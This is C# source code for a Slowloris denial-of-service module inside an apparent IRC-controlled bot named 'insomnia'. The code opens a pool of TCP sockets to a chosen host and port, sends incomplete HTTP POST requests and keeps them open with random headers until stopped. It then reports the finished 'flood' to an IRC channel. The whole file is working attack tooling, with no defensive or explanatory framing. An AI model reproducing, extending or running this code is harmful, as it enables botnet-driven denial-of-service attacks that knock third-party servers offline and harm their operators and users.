using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using System.Net;
using System.Net.Sockets;

namespace insomnia
{
    internal class Slowloris
    {
        public static string host;
        public static int delay;
        public static int port;
        public static int sockets = 25;
        public static bool isEnabled = false;

        public static void Begin()
        {
            int seconds = delay * 1000;
            new Thread(() => SendSlow(Functions.ipE(host, port))).Start();

            Thread.Sleep(seconds);

            if (isEnabled)
            {
                Stop();
                IRC.WriteMessage("Slowloris flood on" + IRC.ColorCode(" " + host) + " for" + IRC.ColorCode(" " + delay) + " seconds has finished.", Config._mainChannel());
            }
        }

        public static void Stop()
        {
            isEnabled = false;
        }

        public static void SendSlow(IPEndPoint ip)
        {
            string request = "POST {0} HTTP/1.1\r\nHost: {1}\r\nUser-Agent: {2}\r\nContent-Length: {3}\r\n";
            string headerReq = "X-{0}: {1}\r\n";
            string build_request = string.Format(request, "/?" + Functions.RandomString(7), host, "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:9.0.1) Gecko/20100101 Firefox/9.0.1", Functions.rand.Next(42, 9000));
            byte[] data = Encoding.UTF8.GetBytes(build_request);

            Socket[] slowSocks = new Socket[sockets];

            for (int i=0; i < sockets; i++)
            {
                slowSocks[i] = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                slowSocks[i].Connect(ip.Address, port);
                slowSocks[i].Send(data, data.Length, 0);
            }

            // As long as flood is enabled lets send data on each socket
            while (isEnabled)
            {
                try
                {
                    string build_header = string.Format(headerReq, Functions.RandomString(1).ToLower(), Functions.RandomString(1).ToLower());
                    byte[] headerData = Encoding.UTF8.GetBytes(headerReq);

                    for (int i = 0; i < sockets; i++)
                    {
                        slowSocks[i].Send(headerData, headerData.Length, 0);
                    }
                }
                catch
                {
                    for (int i = 0; i < sockets; i++)
                    {
                        if (slowSocks[i].Connected)
                            slowSocks[i].Close();

                        slowSocks[i] = null;
                        slowSocks[i] = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                        slowSocks[i].Connect(ip.Address, port);
                        slowSocks[i].Send(data, data.Length, 0);
                    }

                    Thread.Sleep(2000);
                }

                Thread.Sleep(Functions.rand.Next(2000, 9000));
            }

            // Cleanup
            for (int i = 0; i < sockets; i++)
            {
                if (slowSocks[i].Connected)
                    slowSocks[i].Close();

                slowSocks[i] = null;
            }
        }
    }
}
